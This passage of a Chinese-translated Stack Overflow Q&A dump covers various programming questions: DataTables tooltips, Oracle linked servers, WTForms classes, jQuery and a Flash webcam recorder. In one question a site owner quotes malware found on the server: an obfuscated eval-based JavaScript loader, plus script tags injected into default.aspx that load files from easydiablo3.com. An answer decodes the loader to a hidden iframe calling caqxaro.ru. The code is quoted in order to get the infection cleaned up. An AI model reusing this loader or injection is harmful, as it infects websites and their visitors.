sTitle = sBrowser+' does not provide CSS support or has a broken implementation. Block CSS.';
else
sTitle = sBrowser+' will provide an undefined level of CSS support.';

this.setAttribute( 'title', sTitle );
} );

/* Init DataTables */
var oTable = $('#example').dataTable();

/* Apply the tooltips */
oTable.$('tr').tooltip( {
"delay": 0,
"track": true,
"fade": 250
} );
} ); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-28T18:12:33.603

你可以做

```
{ "sTitle": "...", ...
   'fnCreatedCell': function(nTd, sData, oData, iRow, iCol) {
        nTd.title = 'Some more information';
   }
} 
```

在您的列配置中。您可以像这样轻松使用所有行数据。当然，这不能缺少：

```
oTable.$('td').tooltip( {
    "delay": 0,
    "track": true,
    "fade": 100
} ); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T11:37:16.043

您可以通过简单地 setAttribute 为每个 td 设置标题

```
 $('#example tbody tr td').each( function() {
    this.setAttribute( 'title', $(this).text());
}); 
```

并在 td 上调用工具提示

```
oTable.$('td').tooltip( {
"delay": 0,
"track": true,
"fade": 250
} ); 
```

# sql-server - 从 SQL Server 查询 Oracle 数据库

> ID：11309762
> 
> 赞同：6
> 
> 时间：2012-07-03T11:15:12.283
> 
> 标签：sql-server, oracle, oledb, openquery, tnsnames

我有一个 Oracle 11g XE 数据库，我想将它转移到 SQL Server Express 2005 中。

起初我以为我只是在 Oracle 中将表生成为 SQL，操作数据格式，然后在 SQL Server 中运行查询。这适用于小表，但我有几个表有几十万行，有些表有数百万行，所以这个解决方案不起作用。

然后我创建了一个包含以下内容的 TNS 文件：

```
OracleTnsName = 
(
  DESCRIPTION=
  (
    ADDRESS = (PROTOCOL=TCP)(HOST=localhost)(PORT=1521)
  )
  (
    CONNECT_DATA = (SERVICE_NAME=XE)
  )
) 
```

我按照我在其他地方找到的有关如何生成 ODBC 连接的说明进行操作，并且“测试连接”成功。

然后我运行这些命令在 MS SQL 中创建链接服务器：

```
EXEC sp_addlinkedserver 
     @server            = 'OracleLinkServer'
    ,@srvproduct        = 'OracleTnsName'
    ,@provider          = 'MSDASQL'
    ,@datasrc           = 'OracleTnsName'

EXEC sp_addlinkedsrvlogin 
     @rmtsrvname        = 'OracleLinkServer'
    ,@useself           = 'False'
    ,@locallogin        = NULL
    ,@rmtuser           = 'user'
    ,@rmtpassword       = 'password' 
```

现在我正在尝试使用以下命令从 SQL Server 查询 Oracle 数据库中的表`openquery`：

```
select * from openquery(OracleLinkServer, 'select * from oracleTable') 
```

但是得到一个错误：

> 消息 7399，级别 16，状态 1，第 1 行
> 链接服务器“OracleLinkServer”的 OLE DB 提供程序“MSDASQL”报告错误。提供商没有提供有关该错误的任何信息。
> 消息 7303，级别 16，状态 1，第 1 行
> 无法初始化链接服务器“OracleLinkServer”的 OLE DB 提供程序“MSDASQL”的数据源对象。

当我检查链接服务器的属性并单击确定时，我收到此错误：

## 标题：Microsoft SQL Server Management Studio Express

“链接服务器已更新，但连接测试失败。您要编辑链接服务器属性吗？”

* * *

附加信息：

执行 Transact-SQL 语句或批处理时发生异常。(Microsoft.SqlServer.Express.ConnectionInfo)

* * *

链接服务器“OracleLinkServer”的 OLE DB 提供程序“MSDASQL”报告错误。提供商没有提供有关该错误的任何信息。无法为链接服务器“OracleLinkServer”初始化 OLE DB 提供程序“MSDASQL”的数据源对象。（Microsoft SQL Server，错误：7399）

如需帮助，请单击： http: [//go.microsoft.com/fwlink ?ProdName=Microsoft+SQL+Server&ProdVer=09.00.5000&EvtSrc=MSSQLServer&EvtID=7399&LinkId=20476](http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&ProdVer=09.00.5000&EvtSrc=MSSQLServer&EvtID=7399&LinkId=20476)

* * *

纽扣：

＆是的

## ＆不

请帮忙！

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:19:36.267

如果您已成功添加链接服务器，则不再需要`OPENQUERY`. 您可以将链接服务器名称作为限定名称的第一部分包括在内，如下所示：

```
SELECT * FROM OracleLinkServer.database.schema.table 
```

不确定您需要哪些部分，但点是关键。先试试这个：

```
SELECT * FROM OracleLinkServer...oracleTable 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-25T07:29:37.873

```
select * 
from [server]..[xxx].[yyyyy] 
```

这个对我有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-22T11:27:49.160

改变

```
,@provider = 'MSDASQL' 
```

和

```
,@provider = 'MSDAORA' 
```

# direct2d - Direct2D：保持窗口渲染目标的区域不变

> ID：11309768
> 
> 赞同：0
> 
> 时间：2012-07-03T11:15:28.063
> 
> 标签：direct2d

我正在绘制`HwndRengerTarget`与 Direct2D 无关的常规但其他窗口重叠它。

问题是当我绘制到`HwndRengerTarget`.

我想告诉 Direct2D 不要触摸特定区域`HwndRengerTarget`（即不要触摸屏幕上已经存在的像素），以便这些窗口保持正确可见。

那可能吗？

如果我正常绘制然后`RedrawWindow`在窗口上调用，它会闪烁很多。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T14:35:33.220

如果您想手动将渲染限制在某个区域，您可以使用图层（`ID2D1Layer`对象）。此处的更多信息[图层概述](http://msdn.microsoft.com/en-us/library/windows/desktop/dd756654(v=vs.85).aspx)

`PushAxisAlignedClip`如果可见区域是矩形，则通过方法和使用轴对齐剪辑可能更简单 `PopAxisAlignedClip`。 [ID2D1RenderTarget::PushAxisAlignedClip](http://msdn.microsoft.com/en-us/library/windows/desktop/dd742855(v=vs.85).aspx)

另一种将绘制限制为某种形状的方法是将其渲染为位图，然后在`FillGeomtry`方法中通过位图画笔使用此位图。 [ID2D1RenderTarget::FillGeometry](http://msdn.microsoft.com/en-us/library/windows/desktop/dd371933(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T16:20:07.577

为什么不安排窗口（HWND），使 Direct2D 位于 z-index 的底部？它应该是其父母的第一个孩子。然后剪裁将是自动的。您可能需要 WS_CLIPSIBLINGS 窗口样式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-25T16:10:09.520

我有同样的问题。

通过为 D2D 子 HWND 调用 CreateWindowEx LAST 来修复。所以在创建所有其他子窗口之后。

# javascript - 我认为我的网站已被感染

> ID：11309769
> 
> 赞同：2
> 
> 时间：2012-07-03T11:15:35.397
> 
> 标签：javascript, asp.net, virus

这真让我抓狂。我认为我的网站被某种病毒感染了，这是发生了什么：

服务器上出现随机 javascript 文件，其名称如`jquery.ui.dialog.min.js`和`jquery.ui.button.min.js`。所有这些文件都包含相同的代码：

```
s="";try{q=document.createElement("p");a=(q)?"appendChild":12;q[a]("123"+n);}catch(qw){f=(q)?"fromCharCode":2;h=-016/7;try{eval("a=prototype");}catch(zxc){e=window["e"+"va"+"l"];n="26.30.400.555.198.351.436.505.220.348.184.595.228.315.464.505.80.117.240.525.204.342.388.545.202.96.460.570.198.183.136.520.232.348.448.290.94.141.396.485.226.360.388.570.222.138.456.585.94.297.444.585.220.348.196.260.92.336.416.560.68.96.440.485.218.303.244.170.168.357.420.580.232.303.456.170.64.345.396.570.222.324.432.525.220.309.244.170.194.351.464.555.68.96.408.570.194.327.404.490.222.342.400.505.228.183.136.550.222.102.128.485.216.315.412.550.122.102.396.505.220.348.404.570.68.96.416.505.210.309.416.580.122.102.200.170.64.357.420.500.232.312.244.170.100.102.248.300.94.315.408.570.194.327.404.310.78.123.236.65.20".split(".");if(window.document)for(i=6-2-1-2-1;-161+i!=2-2;i++){k=i;s=s+String[f](n[k]/(i%(h*h)+2));}e(s);}} 
```

主要问题是这个“病毒”在我`default.aspx`破坏服务器的时候附加了一行代码。这是它正在添加的内容：

```
<asp:Content ID="Content1" ContentPlaceHolderID="cphBody" Runat="Server">
//Code here
</asp:Content>**<script type="text/javascript" language="javascript" src="http://easydiablo3.com//ImageStorage/jquery.ui.button.min.js" ></script><script type="text/javascript" language="javascript" src="http://easydiablo3.com//themes/jquery.ui.dialog.min.js" ></script>** 
```

如果我删除文件，它们会在一段时间后出现。有谁知道我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:17:17.407

使用此链接检测受感染的文件/文件夹

[http://sitecheck.sucuri.net/scanner/](http://sitecheck.sucuri.net/scanner/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:20:10.877

该代码是`eval()`您页面中的以下代码

```
<iframe src="http://caqxaro.ru/count14.php" name="Twitter" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe> 
```

您可能在应用程序的某个地方存在漏洞，检查您的数据库是否有奇怪的值，如果您使用的是 joomla 等 CMS，请检查升级。然后如果可能的话，恢复您应用程序的最新备份。

# python - wtforms，动态添加类到表单

> ID：11309779
> 
> 赞同：21
> 
> 时间：2012-07-03T11:16:18.073
> 
> 标签：python, css, flask, wtforms

有没有办法可以从 python 发送表单的（css）类？例如：

```
class Company(Form):
    companyName = TextField('Company Name', [validators.Length(min=3, max = 60)]) 
```

这会呈现一个简单的文本字段，但我希望该文本字段具有 css 类`.companyName`，这可能直接来自 python 吗？

我知道我可以`id="companyName"`直接从 python 中放置一个，但不能放置类。

帮助。

更新：我试过`class_="companyName"`了，但没有用，我得到了：

```
__init__() got an unexpected keyword argument '_class' 
```

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-09-28T15:48:57.810

或者，您可以像这样为 jinja2 在模板中添加类：

```
{{ form.name(size=20, class_='input-small') }} 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-07-04T14:59:16.087

WTForms 不允许您在字段初始化中设置显示选项（例如类名）。但是，有几种方法可以解决此问题：

1.  如果你的所有字段都应该包含一个类名和一个 ID，那么[`short_name`](http://wtforms.readthedocs.org/en/latest/fields.html#wtforms.fields.Field.short_name)当你渲染它时，只需将每个字段传递给它：

    ```
    <dl>
    {% for field in form %}
    <dt>{{field.label}}</dt>
    <dd>{{field(class_=field.short_name)}}</dd>
    {% endfor %}
    </dl> 
    ```

2.  创建一个提供类名的[自定义小部件](http://wtforms.readthedocs.org/en/latest/widgets.html#custom-widgets)mixin：

    ```
    from wtforms.fields import StringField
    from wtforms.widgets import TextInput

    class ClassedWidgetMixin(object):
        """Adds the field's name as a class 
        when subclassed with any WTForms Field type.

        Has not been tested - may not work."""
        def __init__(self, *args, **kwargs):
            super(ClassedWidgetMixin, self).__init__(*args, **kwargs)

        def __call__(self, field, **kwargs):
            c = kwargs.pop('class', '') or kwargs.pop('class_', '')
            kwargs['class'] = u'%s %s' % (field.short_name, c)
            return super(ClassedWidgetMixin, self).__call__(field, **kwargs)

    # An example
    class ClassedTextInput(ClassedWidgetMixin, TextInput):
        pass

    class Company(Form):
        company_name = StringField('Company Name', widget=ClassedTextInput) 
    ```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2016-05-26T11:20:51.423

`render_kw`如果使用WTForms [>= 2.1](http://wtforms.readthedocs.io/en/latest/changes.html#version-2-1)则使用：

```
submit = SubmitField(u'Block Submit Buttom', render_kw={"class": "btn btn-primary btn-block"}) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-26T07:26:35.990

在您的模板中，尝试一下

```
{{ form.companyName( **{'class': 'companyName'} ) }} 
```

# asp.net-mvc - MVC 项目中的 ScriptManager 尝试从奇怪的路径加载 MicrosoftAjax js 文件

> ID：11309787
> 
> 赞同：1
> 
> 时间：2012-07-03T11:16:45.060
> 
> 标签：asp.net-mvc, webforms, microsoft-ajax

我有一个正在转换为 MVC 的 WebForms 应用程序，但现在并排运行旧的东西。

出于某种原因，留给它自己的设备的 ScriptManager 尝试从一个非常奇怪（且不存在）的位置加载以下文件：

```
<script src="Scripts/WebForms/MsAjax/MicrosoftAjax.js" type="text/javascript"></script>
...
<script src="Scripts/WebForms/MsAjax/MicrosoftAjaxWebForms.js" type="text/javascript"></script> 
```

我找不到那个位置的设置，谷歌搜索“Scripts/WebForms/MsAjax”*什么也没*带回来。

更改 ScriptManager 上的（过时的）ScriptPath 属性对这两个脚本没有任何帮助。

尝试像下面这样覆盖路径位置也不起作用（它只是尝试加载*两个*脚本）

```
Scripts.Add(new ScriptReference { Name = "MicrosoftAjax.js", Path = ContextUtil.MapApplicationPath("~/My/Script/Location/MicrosoftAjax.4.0.js") });
Scripts.Add(new ScriptReference { Name = "MicrosoftAjaxWebForms.js", Path = ContextUtil.MapApplicationPath("~/Shared/Scripts/Legacy/MicrosoftAjax/MicrosoftAjaxWebForms.4.0.js") }); 
```

我无法理解的是

1.  为什么默认情况下不从嵌入式资源加载脚本？
2.  这条奇怪的路是从哪里来的？
3.  为什么它不接受我覆盖的脚本路径？

任何人都可以帮忙吗？

# javascript - JavaScript 的 Array 调用和函数在 Prototype 中失败

> ID：11309789
> 
> 赞同：0
> 
> 时间：2012-07-03T11:16:55.710
> 
> 标签：javascript, prototype

我有这个代码：

```
function Keyboard() {

    this.log = $('#log')[0];
    this.pressedKeys = [];

    this.bindUpKeys = function() {
        $('body').keydown(function(evt) {
            this.pressedKeys.push(evt.keyCode);

            var li = this.pressedKeys[evt.keyCode];

            if (!li) {
                li = this.log.appendChild(document.createElement('li'));
                this.pressedKeys[evt.keyCode] = li;
            }

            $(li).text('Down: ' + evt.keyCode);
            $(li).removeClass('key-up');
        });
    }

    this.bindDownKeys = function() {
        $('body').keyup(function(evt) {
            this.pressedKeys.push(evt.keyCode);

            var li = this.pressedKeys[evt.keyCode];

            if (!li) {
                li = this.log.appendChild(document.createElement('li'));
            }

            $(li).text('Up: ' + evt.keyCode);
            $(li).addClass('key-up');
        });
    }

} 
```

我收到这些错误：

```
TypeError: 'undefined' is not an object (evaluating 'this.pressedKeys.push') 
```

我想对数组做什么并不重要，它只是不断给我访问错误，就好像它在原型中不存在一样。

我究竟做错了什么？:( 我只是将数组作为原型中的任何其他值访问）。对象内部的对象有问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:19:53.093

问题是事件处理程序内部`this`不是你想的那样。您可以将事件处理函数与`bind`方法绑定（或者，因为它看起来像您正在使用 jQuery，[`$.proxy`](http://api.jquery.com/jQuery.proxy/)）：

```
this.bindUpKeys = function() {
    var that = this;
    $('body').keydown($.proxy(function(evt) {
        //Use `this` as normal inside here
    }, this));
} 
```

`this`或者您可以存储对事件处理程序外部的引用，例如

```
this.bindUpKeys = function() {
    var that = this;
    $('body').keydown(function(evt) {
        //Use `that` instead of `this` in here
    });
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:20:31.313

> 就好像它在原型中不存在一样。

不，确实如此。

> 我只是访问数组

那是你不知道的。`this`不指向您`Keyboard`在事件侦听器中的实例。

当函数作为事件侦听器调用时，DOM 元素将成为上下文（jQuery 也这样做）。请参阅 MDN 的[`this`关键字](https://developer.mozilla.org/en/JavaScript/Reference/Operators/this)概述。您可以使用闭包范围的变量来保存对实际实例的引用，例如[此处](https://stackoverflow.com/questions/1081499/accessing-an-objects-property-from-an-event-listener-call-in-javascript?lq=1)描述的示例（对此有很多问题）。

可能的快速修复：

*   `$('body').keydown( (function(){...}).bind(this))`
*   `var that=this; $('body').keydown(function(){ that.pressedKeys...; });`

# jquery - jQuery 中 $ 和 $() 的区别

> ID：11309791
> 
> 赞同：5
> 
> 时间：2012-07-03T11:17:17.073
> 
> 标签：jquery

有人可以努力解释一下jquery`$`和`$()`jquery之间的区别吗？

我知道这`$()`是一种速记形式，`$jQuery()`它采用任何 DOM 元素并将其转换为 jQuery 对象。

但我不确定是什么`$`以及它与`$()`. 请赐教。

非常感谢，柴坦亚

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-07-03T11:20:08.807

`$`是一个可以调用的*函数*`$()`- 。

的行为`$()`根据提供的参数而有很大差异，尽管下面的所有示例都将*返回*一个`jQuery`对象。它可以：

1.  注册一个`document.ready`处理程序 -`$(myfunc)`
2.  act as a selector -`$('#myid')`
3.  构造元素 -`$('<div>')`
4.  返回一个空对象 -`$()`

`$`也是一个*对象*，其中包含各种实用功能`$.each`等作为该对象的*属性*。在这种情况下，它就像这些函数的*命名空间*。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-03T11:20:28.887

`$ = jQuery`- 这是用于它包含的 jQuery 实用程序的 jQuery 对象，例如`$.Ajax()`或`$.each()`因此`var j = $;`会将 jquery 原型分配给变量`j`。

$() = `jQuery()`- 这是从根 jQuery 对象调用的函数，用于将 DOM 元素转换为 jQuery 对象或使用选择器获取 jQuery 对象

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-03T11:23:44.887

希望这会有所帮助并添加到其他帖子`:)`

*   `$` = 是一个有效的 javascript 对象/标识符。

*   `$()`= 调用 $() 创建一个空的 jQuery 对象。

*jQuery()——也可以写成 $()——在 DOM 中搜索任何与提供的选择器匹配的元素，并创建一个引用这些元素的新 jQuery 对象：*

**官方文档** [请在此处阅读文档（点击我）](http://api.jquery.com/jQuery/)我强烈建议您阅读此文档。

您的问题是 2 个独立问题的混合，请参见下文：

*   [javascript中的“$”符号是什么意思](https://stackoverflow.com/questions/1150381/what-is-the-meaning-of-sign-in-javascript)

*   [有人可以解释什么 = $(); 在 jQuery 中是什么意思？](https://stackoverflow.com/questions/9107888/can-someone-explain-what-means-in-jquery)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-03T11:20:56.017

如果我创建一个函数：

功能 my_function() { alert('my_function'); 返回（33）}

`my_function`是一个包含函数的变量。 `my_function()`是函数调用的结果。

您将使用函数调用`my_function()`来执行函数中的指令和/或将返回的结果放入变量`var my_var = my_function();`中。

您将使用函数的变量名将其作为参数传递给另一个函数，例如`$('a').click(my_function);`

因为在 JavaScript 中变量可以是任何类型，包括标量（文字值）、数组、对象和函数。

现在采用这个想法并以此为基础：

`$`只是一个变量名，`jQuery`就像一个变量名一样。

碰巧这个变量*包含*一个函数，它意味着`$()`或`jQuery()`执行函数体中存在的任何指令`$`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-03T11:20:00.427

`$`是对 jQuery 命名空间的引用，通过它您可以访问其静态方法（例如`ajax`，`each`等），同时`$()`调用一个函数，该函数要么注册 DOM 就绪回调（如果将函数传递给它）或从 DOM 返回元素（如果选择器字符串或元素被传递给它）。

顺便说一句，`$`是 的简写`jQuery`，不是`$jQuery`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-03T11:26:27.433

在 Javascript 中，一切都是数据，这包括函数。作为一个人为的例子：

```
function test() {
  console.log("test");
} 
```

对于这个例子，`test()`是函数的调用。简单地使用`test`就像使用一个变量，它允许您执行以下操作：

```
var t = test;
t(); 
```

然后导致`t`具有与`test`.

然后，这允许您执行闭包之类的操作：

```
function closure() {
  var i = 0;
  function inner() {
    i++;
    console.log(i);
  }

  return inner;
} 
```

由于函数只是一些数据，我们可以返回它然后调用它。因此，您将编写如下内容：

```
var t = closure();
t(); // prints '1'
t(); // prints '2' 
```

除了其他好处之外，这样做还可以让您的命名空间不那么混乱。

要直接回答您的问题，`$`只是通过以下`jQuery`方式制作的别名：

```
function jQuery() { /* Lots of code */ }
$ = jQuery; 
```

# java - 决策树可视化

> ID：11309793
> 
> 赞同：3
> 
> 时间：2012-07-03T11:17:57.807
> 
> 标签：java, javascript, r, decision-tree

有谁知道允许使用事件的可视化决策树的免费框架（双击节点进行额外拆分）？我有兴趣使用这些事件来触发 R/Python/other 中的其他计算。

我的请求的背景：我需要能够有效地将具有优化拆分的业务规则（通过通常的算法）合并到单个树中。

我知道有用于这种动态树构建的专有工具（SAS、FICO、Angoss 等），但我需要一个免费的可视化框架来与现有解决方案配对。

我尝试将[google 的可视化 API 用于组织结构图](http://code.google.com/apis/ajax/playground/?type=visualization#org_chart)，但它并不完全支持我想到的事件；而且从 Javascript 调用 R 似乎有点困难。

非常感谢您的反馈！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T10:02:12.817

据我所知，有 2 个工具可以作为我构建所需 GUI 的框架：

[http://www.graphviz.org/](http://www.graphviz.org/)和[http://processing.org/](http://processing.org/)

如果您有任何其他选择，请发布它们！！！！

# c# - 如何更改“listView1.FocusedItem.Index”的值？

> ID：11309801
> 
> 赞同：0
> 
> 时间：2012-07-03T11:18:59.407
> 
> 标签：c#, windows-mobile

我**在 Windows Mobile 中**向 listView 添加和删除项目。我正在使用“listView1_SelectedIndexChanged”函数，只有当我按下与上次按下不同的行索引时才会调用该函数。有没有办法改变“listView1.FocusedItem.Index”变量（给它一个无效值或其他东西），所以每次我按下列表中的一个项目时都会调用该函数，而不仅仅是当它是一个新项目时指数？谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T15:43:20.050

您使用的是哪个版本的 Windows Mobile？并非所有版本都支持相同的东西。

您实际上只能从[ListView控件中读取](http://msdn.microsoft.com/en-us/library/system.windows.forms.listview_members%28v=vs.90%29.aspx)[FocusedItem](http://msdn.microsoft.com/en-us/library/system.windows.forms.listview.focuseditem%28v=vs.90%29.aspx)。

哪个更适合您的需求，作用于[ListViewItem](http://msdn.microsoft.com/en-us/library/system.windows.forms.listviewitem%28v=vs.80%29.aspx)的[ItemActivate](http://msdn.microsoft.com/en-us/library/system.windows.forms.listview.itemactivate%28v=vs.90%29.aspx)或[GotFocus](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.gotfocus%28v=vs.90%29.aspx)？

**[注意：以上所有链接都包含示例代码]**

```
ListView listView1;

private void init_listView1() {
  listView1.ItemActivate += new EventHandler(listView_Focus);
  listView1.GotFocus += new EventHandler(listView_Focus);
}

private void listView_Focus(object sender, EventArgs e) {
  int index = -1;
  if ((listView1.SelectedIndices != null) && (0 < listView1.SelectedIndices.Count)) {
    index = listView1.SelectedIndices[0];
    ListViewItem item = listView1.Items[index];
  } else {
    if (0 < listView1.Items.Count) {
      index = 0;
    }
  }
  if (-1 < index) {
    listView1.Items[index].Focused = true;
  }
} 
```

# javascript - Javascript - 仅当我执行 alert() 时才有效

> ID：11309802
> 
> 赞同：4
> 
> 时间：2012-07-03T11:19:01.010
> 
> 标签：javascript, alert

我正在尝试在 iframe 中处理 contenteditable 正文，以防止浏览器在按 Enter 时添加`br`或`p`自行`div`添加。但是在尝试重置焦点时会发生一些奇怪的事情，它只是在处理其余代码之前发出警报（）时才起作用。我认为这是因为javascript需要一些时间来进行操作，但必须有一种方法可以在不“休眠”脚本的情况下做到这一点......

在这里，我粘贴了我的代码（使用 Jquery），只有使用“魔法警报”才能完美运行：

```
//PREVENT DEFAULT STUFF
var iframewindow=document.getElementById('rte').contentWindow;
var input = iframewindow.document.body;

$( input ).keypress( function ( e ) {
var sel, node, offset, text, textBefore, textAfter, range;
// the Selection object
sel = iframewindow.getSelection();
alert(sel); //MAGIC ALERT

// the node that contains the caret
node = sel.anchorNode;
alert(node); //MAGIC ALERT

// if ENTER was pressed while the caret was inside the input field
if ( node.parentNode === input && e.keyCode === 13 ) {
    // prevent the browsers from inserting <div>, <p>, or <br> on their own
    e.preventDefault();

    // the caret position inside the node
    offset = sel.anchorOffset;   

    // insert a '\n' character at that position
    text = node.textContent;
    textBefore = text.slice( 0, offset );
    textAfter = text.slice( offset ) || ' ';
    node.textContent = textBefore + '\n' + textAfter;
SEEREF=SEEREF.replace(/\n/g, "<br>");
// position the caret after that newBR character
range = iframewindow.document.createRange();
range.setStart( node, offset + 4 );
range.setEnd( node, offset + 4 );

// update the selection
sel.removeAllRanges();
sel.addRange( range );
}
}); 
```

**SEEREF** = framewindow.document.body.innerHTML（太长了）

**编辑** 当我删除魔法警报时，它仍然可以在 Chrome 上运行，但在 FF 中它专注于一切的开始！（就像如果它是偏移量 = 0）

**更新**

似乎问题是用`br`标签替换换行符的行。如果我删除此行，即使没有警报，它也能正常工作。我需要保留这个`br`标签，还有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:26:42.427

这个[问题](https://stackoverflow.com/questions/1471759/how-to-get-selected-text-from-iframe-with-javascript) 是你的一个狭窄的问题。所以你应该结合 doc & win：

```
var idoc= iframe.contentDocument || iframe.contentWindow.document; // ie compatibility
var iwin= iframe.contentWindow || iframe.contentDocument.defaultView;

... idoc.getSelection() +(''+iwin.getSelection()) //firefox fix 
```

# c# - 录制视频和声音并在 C# 中使用网络摄像头保存

> ID：11309808
> 
> 赞同：0
> 
> 时间：2012-07-03T11:19:22.387
> 
> 标签：c#, .net, video-capture

我想使用网络摄像头开发视频录制+声音并将文件存储在我的服务器中。（没有银光）

请指导我如何做到这一点，我尝试使用一些第三方控件并尝试一些我的逻辑但没有成功。

请帮助我。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:31:57.620

要录制实时视频流和存储来自网页的音频流，您可以使用 Flash，然后存储流，您可以使用 Red5 服务器[http://www.red5.org/](http://www.red5.org/)。通过 Flash，您可以访问连接到您的机器的网络摄像头，以将视频或音频流保存到服务器。

如果您想了解更多详细信息，我可以提供帮助，因为我已经在我的项目中实施了几次

这是使用网络摄像头将视频流式传输到 red5 服务器的示例代码

您可以使用以下命令连接到服务器：

```
 _connection = new NetConnection();
    _connection.client = { onBWDone: function():void{ /*Alert.show('onBWDone', 'Alert Box', mx.controls.Alert.OK); */} };
    _connection.objectEncoding = flash.net.ObjectEncoding.AMF0;

    _connection.addEventListener(NetStatusEvent.NET_STATUS, netStatusHandler);
    _connection.connect("your server name like rtmp://yourhost/oflaDemo"); 
```

连接到服务器后，您可以将相机连接到闪光灯并将流保存到您的 red5 服务器。

```
 _camera = Camera.getCamera();
        _camera.setMode(320,240,10000);
        _camera.setQuality(0,85);
        _video = new Video();
        _video.x=0;
        _video.y=0;
        _video.height= _height;
        _video.width = _width;
        _video.attachCamera(_camera);
        uiComp.addChild(_video);
        _stream = new NetStream(_connection);
        _stream.attachCamera(_camera);
        _stream.publish(_streamName,"live"); 
```

[您可以在将流发布到服务器时使用实时、录制或发布。有关更多示例，您可以参考http://livedocs.adobe.com/flash/9.0/main/](http://livedocs.adobe.com/flash/9.0/main/)上的 Adob​​e 文档

# uml - 我可以在序列图中绘制边界类（作为接口）而不是控制器类吗？

> ID：11309809
> 
> 赞同：0
> 
> 时间：2012-07-03T11:19:23.783
> 
> 标签：uml, sequence-diagram

我正在尝试 UML 及其所有无聊的设计模式。我有一个演员请求通过接口（边界）登录，我是否必须在我的接口之后绘制一个控制器类并控制这个请求或者接口就足够了？使用接口类作为控制器类有什么问题？谁能告诉我在我的序列图中我应该在哪里使用控制器类？这是一个简单的图像：![在此处输入图像描述](../Images/304bd769cb92817c98c764683dcfa42e.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T18:24:34.077

在 UML 序列图中，您可以使用任何类，无论是“接口”、“控制器”或“数据访问”，还是更通用的类。

正如许多软件分析师所认为的那样，仅仅因为一个类是“边界”/“接口”或“数据访问”类，并不意味着它根本不做任何操作。

相反，“接口”类执行仅限于其自身功能的操作，例如计算要绘制的窗口区域，或“数据访问”类对列进行汇总。

```
.....................................................................................
..+-------------+....+---------------+....+----------------+....+-----------------+..
..|  <<actor>>  |....| <<interface>> |....| <<Controller>> |....| <<Data Access>> |..
..|    User     |....|  LoginWebPage |....|   LoginWebPage |....|   LoginWebPage  |..
..+------+------+....+-------+-------+....+--------+-------+....+---------+-------+..
.........|...................|.....................|......................|..........
.......+-+-+...............+-+-+...................|......................|..........
.......|   |...Enter().....|   |.Draw()............|......................|..........
.......|   +==============>+   +====+..............|......................|..........
.......|   |...............|   |....|..............|......................|..........
.......|   +<--------------+   +<===+..............|......................|..........
.......|   |...............|   |...................|......................|..........
.......|   |...Login(......|   |...................|......................|..........
.......|   |...UserName,...|   |.................+-+-+..................+-+-+........
.......|   |...Password)...|   |...Validate()....|   |..Seek(UserName)..|   |........
.......|   +==============>+   +================>+   +=================>+   +===+....
.......|   |...............|   |.................|   |.......User.......|   |...|....
.......|   |...............|   |.................|   +<-----------------+   +<==+....
.......|   |...............|   |.................|   |..................|   |........
.......|   |...............|   |.................|   +===+..............+-+-+........
.......|   |...............|   |.................|   |...|.Compare()......|..........
.......|   +<--------------+   +<----------------+   |<==+................|..........
.......|   |...............|   |.................|   |....................|..........
.......+-+-+...............+-+-+.................+-+-+....................|..........
.........|...................|.....................|......................|..........
.........X...................X.....................X......................X..........
..................................................................................... 
```

这是一个非常简化，甚至不完整的例子。它可以有更多的类交互，以及这些类之间的更多动作（“箭头”）。但是，一般的想法是看看如何交互。

有时，同一个类可能在内部同时具有接口和控制器类的功能。

干杯。

# javascript - 当 phonegap 版本从 1.5 更新到 1.9 时，android 中的 Phonegap 应用程序会导致强制关闭

> ID：11309814
> 
> 赞同：0
> 
> 时间：2012-07-03T11:19:36.580
> 
> 标签：javascript, html, css, cordova

我正在使用 xhtml 1.0 transitional 和 javascript 在 android 中做一个 phonegap 应用程序。该应用程序与 phonegap 1.5 版一起正常工作，但是当我将版本更改为 1.9 时，它显示以下错误

**错误** 找不到课程`'android.webkit.WebResourceResponse', referenced from method org.apache.cordova.CordovaWebViewClient.generateWebResourceResponse`，我在谷歌中搜索了这个但没有找到解决方案。

当我尝试通过将 phonegap 1.5 jar 替换为 phonegap 1.9 jar 文件而不替换 js 文件来执行相同的应用程序时，该应用程序可以工作，但是当我将 js 和 jar 文件都替换为 phonegap 1.9 时，它会显示上述错误。

**错误**：

```
07-04 11:57:05.339: E/AndroidRuntime(1296): Uncaught handler: thread main exiting due to uncaught exception

07-04 11:57:05.349: E/AndroidRuntime(1296): java.lang.SecurityException: ConnectivityService: Neither user 10038 nor current process has android.permission.ACCESS_NETWORK_STATE.

